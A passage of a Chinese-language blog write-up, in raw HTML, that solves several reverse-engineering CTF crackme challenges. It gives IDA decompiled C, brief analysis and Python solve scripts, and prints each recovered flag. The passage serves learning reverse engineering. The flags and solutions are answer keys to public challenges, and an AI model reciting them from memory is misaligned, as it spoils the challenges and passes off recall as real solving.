punctuation">]</span>    res1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res1 <span class="token operator">=</span> res1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment"># 这里似乎是因为大小端排序的问题似乎，然后上面的内容需要简单地逆一下</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>res1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span><span class="token comment"># GXY&#123;do_not_hate_me&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h3><p><strong>查PE</strong></p><p><img src="/2021/05/28/CTF/image-20210530113755795.png" alt="PE信息"></p><p>emmm，直接拖入ida32看看吧</p><p><strong>得flag</strong></p><p>这种带有GUI的程序逆向主要就是先看字符串信息，直接查找字符串找到flag的一部分，再找到变换flag的关键函数</p><p><img src="/2021/05/28/CTF/image-20210530114039094.png" alt="image-20210530114039094"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  CHAR String<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-64h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">272</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> Format<span class="token punctuation">,</span> <span class="token operator">++</span>dword_4099F0<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_4099F0 <span class="token operator">==</span> <span class="token number">19999</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">EndDialog</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据下面的得到flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BJD&#123;1999902069a45792d233ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h3><p>提示了是elf文件，直接ida64打开之后一路跟踪到关键代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_4009C6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-114h]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-108h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-100h]</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-F8h]</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-F0h]</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-E8h]</span>  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-E0h]</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-D8h]</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-D0h]</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-C8h]</span>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-C0h] BYREF</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+6Dh] [rbp-B3h] BYREF</span>  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+71h] [rbp-AFh] BYREF</span>  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-90h] BYREF</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-70h]</span>  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+B4h] [rbp-6Ch]</span>  <span class="token keyword">char</span> v18<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+C0h] [rbp-60h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-18h]</span>  v19 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Iodl>Qnb(ocy"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"y.i"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token string">"d`3w&#125;wek9&#123;iy=~yL@EC"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v15<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v15<span class="token punctuation">,</span> <span class="token number">37LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">36</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token number">4294967294LL</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"continue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v18<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v18<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v18<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">39</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>      v5 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v9 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400360</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> off_6CC090<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"You found me!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"bye bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token number">4294967293LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>LABEL_13<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v19 <span class="token punctuation">)</span>    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数似乎是个坑，本来我是不太会的，看了wp，原来是下面的这里的内容进行了10次base64解密会获得一个看雪某版主的一篇文章，而那篇文章对解这道题是无用的</p><p><img src="/2021/05/28/CTF/image-20210531125151809.png" alt="image-20210531125151809"></p><p>然后继续向下看，发现字符串<code>byte_6CC0A0</code>，点进去函数，发现这个才是真正的可以获得flag的函数</p><p><img src="/2021/05/28/CTF/image-20210531130338935.png" alt="image-20210531130338935"></p><p>发现该函数对应的反编译出的c语言的代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400D35</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_43FD20</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> qword_6CEE38<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token function">sub_410E90</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>byte_6CC0A0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> j <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  result <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个异或实际上不起任何作用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>异或偶数次还是异或前的内容，所以只需要对于v4，只满足</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与<code>6CC0A0</code>的前四位字符异或后等于<code>flag</code>即可，这里直接写脚本爆破v4与flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">l1 <span class="token operator">=</span> <span class="token string">'@5 V]'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"E'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/$nb&lt;'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'THl$nr&lt;2E['</span>f1 <span class="token operator">=</span> <span class="token string">'flag'</span>key <span class="token operator">=</span> <span class="token string">''</span>f2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    key <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>f1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>    f2 <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">flag</span><span class="token expression"><span class="token punctuation">&#123;</span>Act1ve_Defen5e_Test<span class="token punctuation">&#125;</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h3><p>查字符串找到主要函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-44h]</span>  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-34h] BYREF</span>  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment">// [esp+25h] [ebp-33h]</span>  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-32h]</span>  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment">// [esp+27h] [ebp-31h]</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-30h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+29h] [ebp-2Fh]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+2Dh] [ebp-2Bh]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+31h] [ebp-27h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+35h] [ebp-23h]</span>  <span class="token keyword">unsigned</span> __int8 v11<span class="token punctuation">;</span> <span class="token comment">// [esp+39h] [ebp-1Fh]</span>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-1Dh] BYREF</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Qsw3sj_lz4_Ujw@l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token 